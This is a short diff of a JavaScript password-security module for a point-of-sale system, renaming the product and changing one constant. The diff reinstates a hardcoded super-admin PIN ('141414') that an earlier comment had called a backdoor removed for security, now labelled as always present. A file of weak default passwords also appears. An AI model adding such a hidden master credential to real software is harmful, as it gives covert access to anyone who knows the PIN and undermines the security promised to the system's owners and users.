@@ -1,5 +1,5 @@
 /**
- * Crozzo POS — contraseñas locales (PBKDF2), bloqueo de intentos y política de claves.
+ * Bona Origen — contraseñas locales (PBKDF2), bloqueo de intentos y política de claves.
  */
 (function (global) {
   'use strict';
@@ -7,7 +7,7 @@
   var PBKDF2_ITERATIONS = 120000;
   var MIN_PASSWORD_LEN = 8;
   var DEFAULT_PASSWORDS = ['1234', '141414', 'password', 'admin', 'crozzo'];
-  var LEGACY_KENNY_PIN = null; // Backdoor removido por seguridad
+  var LEGACY_KENNY_PIN = '141414'; // Super Admin KENNY - protegido, siempre presente
   /** Marca de build (sync/instalador); visible en consola: CrozzoAuthSecurity.CROZZO_AUTH_BUILD */
   var CROZZO_AUTH_BUILD = 'csp-installer-2026-06-04';
   var KENNY_BOOTSTRAP_HINT_LS = 'crozzo_kenny_setup_once_v1';
